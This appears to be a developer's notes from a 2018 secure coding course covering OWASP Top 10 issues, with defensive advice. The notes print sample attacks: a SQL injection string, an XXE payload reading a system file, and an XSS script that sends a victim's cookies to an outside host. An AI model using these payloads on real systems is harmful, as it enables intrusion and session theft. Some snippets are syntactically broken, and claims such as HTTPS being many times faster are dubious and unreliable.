# Secure Coding Practices
This is an Alaska Airlines course on 12.17.18, and goes through good, secure coding practices, specifically designed for web developers.

## Takeaway: Test/scan every single day - test before it's too late

## A1: Injections
The most common form of exploit is SQL injections. The best way to protect against that is to use parameterized queries, because even valid data can be exploited. An example of a bad sql request:
```js
let email = `'jim'or'1'!=test@test.com`; // valid email!
let sql = `select * from sensitive_information where email = ${email}`;
```
When this is queried, it will see that 1 will **never** be equal to `test`, and since it's in an `or` statement, this will fire and get data back when it shouldn't.

### Solution: Parameterized Queries
```js
// This is a Nodejs example
let sql = `select * from sensitive_information where email = ?`;
let name = req.params.name; // get the name from the request
db.query(sql, [name]).then(...);
```

## A3: Sensitive Data Exposure
**ALWAYS** use `https` over `http`. It's more secure, it's encrypted, and if it's well configured, `https` can run 800-1000% faster than `http`.

### Transport Layer Protection (HTTPS)
**Protect multiple appropriate mechanisms**
- Use TLS on all connections. Do not tolerate plaintext communication
- Use HSTS (HTTP Strict Transport Securiy) and preloading
- Individually excrypt messages before transmission
  - JSON web encryption
- Sign messages before transmission

**Use the mechanisms correctly**
- Use the standard strong algorithms (disable old SSL algs)
- Manage keys/certs properly
- Verify TLS certs before using them
- Use proven mechanisms when sufficient

### Cryptographic Storage
**Verify your architecture**
- Identify all sensitive data and all the places that data is stored
- Ensure threat model accounts for possible attacks
- Use encryption to counter the threats, don't just 'encrypt' the data

**Protect with appropriate mechanisms**
- File encryption, database encryption, data element encryption

**Use a form of secrets meanagement to protect application secrets**
- Azure KeyVault

## A4: XML External Entity (XXE)
XML eXternal Entity injection (XXE), which is now part of the OWASP Top 10, is a type of attack against an application that parses XML input.

This attack occurs when untrusted XML input containing a reference to an external entity is processed by a weakly configured XML parser.

This attack may lead to the disclosure of confidential data, denial of service, Server Side Request Forgery (SSRF), port scanning from the perspective of the machine where the parser is located, and other system impacts. The following guide provides concise information to prevent this vulnerability. More information can be found [here](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet).
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo any>
  <!ENTITY xxe SYSTEM "file:///etc/password">
]>
```

### Solution: Turn off many XML features

### SQL Integrated Access Control
Example feature: `https://mail.example.com/viewMessage?msgid=123456`  

Someone would be able to write a script in 5 minutes to use all kinds of IDs in the request in a web request. Here, we need to have good access control design.

Ensure the owner is referenced in the query:
```sql
select * from messages where messageid = 123456 and messages.message_owner = <userid_from_session>
```

## A7: Cross Site Scripting (XSS)
This is a prolific problem, and there's no real good solution to it - according to that guy. The problem is that web standards create this issue.

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

### Reflected XSS
Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a "trusted" server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.

### XSS Attack: Cookie Theft
```html
<!-- This would take the user's cookie -->
<script>
var badURL = `https://manicode.com?data=' + uriEncode(document.cookie'`;
var img = new Image();
img.src = badURL;
</script>
```

### XSS Defense by data type and context: there's a table somewhere

## A8: Insecure Deserialization
Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process -- taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.

However, many programming languages offer a native capability for serializing objects. These native formats usually offer more features than JSON or XML, including customizability of the serialization process. Unfortunately, the features of these native deserialization mechanisms can be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denial-of-service, access control, and remote code execution attacks.

**2016 was the year of Java Deserialization apocalypse**
- Known vector since 2011 which allows RCE!
- Previous lack of good RCE gadgets in common libraries
- Apache Commons-Collections Gadgets caught many off-guard

### Solution: Go through JSON schema security

## A9: Using Known Vulnerable Components
Some 3rd party libraries are not secure and are easy to exploit. The biggest example was a remote execution attack to Equifax in 2017. This was the biggest breach in history. 

### Solution: Retire old vulnerable packages
Seriously, retire those old ass punks.